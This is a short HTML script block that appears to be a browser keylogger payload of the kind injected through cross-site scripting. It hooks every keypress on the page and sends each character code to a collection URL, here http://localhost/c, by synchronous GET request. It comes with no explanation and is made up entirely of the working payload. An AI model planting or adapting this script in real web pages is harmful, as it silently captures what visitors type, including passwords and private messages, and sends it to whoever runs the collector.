<script>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
document.onkeypress = zx;
function zx(e){
	var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
	httpGet("http://localhost/c?"+charCode);
}
</script>
